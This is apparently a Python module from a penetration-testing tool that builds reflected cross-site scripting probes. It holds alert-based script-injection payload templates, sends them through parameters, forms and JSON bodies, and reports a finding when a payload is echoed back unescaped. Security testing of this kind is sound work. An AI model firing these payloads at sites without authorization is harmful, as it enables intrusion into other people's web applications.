"""Reflected XSS module."""

from __future__ import annotations

from penpine.attack.generator import PayloadGenerator
from penpine.attack.models import Confidence, Finding, Payload, TestCase
from penpine.attack.module import AttackModule
from penpine.attack.modules._common import body_text, marker
from penpine.attack.types import AttackType
from penpine.attack.validator import Validator

XSS_PAYLOAD_TEMPLATES = [
    '"><svg/onload=alert({m})>',
    "'><script>alert({m})</script>",
    "{m}\"'><x>",
]


class XssGenerator(PayloadGenerator):
    def __init__(self, templates=None):
        self._templates = list(templates) if templates is not None else list(XSS_PAYLOAD_TEMPLATES)

    def generate(self, point, request):
        for template in self._templates:
            mk = marker("PXSS")
            value = template.format(m=mk)
            yield TestCase(
                point=point,
                payload=Payload(value, technique="reflected"),
                attack_type=AttackType.XSS,
                marker=mk,
            )


class XssValidator(Validator):
    def evaluate(self, test_case, response, baseline=None):
        if test_case.payload.value in body_text(response):
            return Finding(
                AttackType.XSS,
                test_case.point,
                test_case.payload,
                Confidence.HIGH,
                "payload reflected unescaped in response body",
                request=test_case.request,
                response=response,
            )
        return None


XSS_MODULE = AttackModule(
    "xss",
    XssGenerator(),
    XssValidator(),
    attack_type=AttackType.XSS,
    applies_to=("param", "form", "json", "multipart"),
    description="reflected XSS",
)
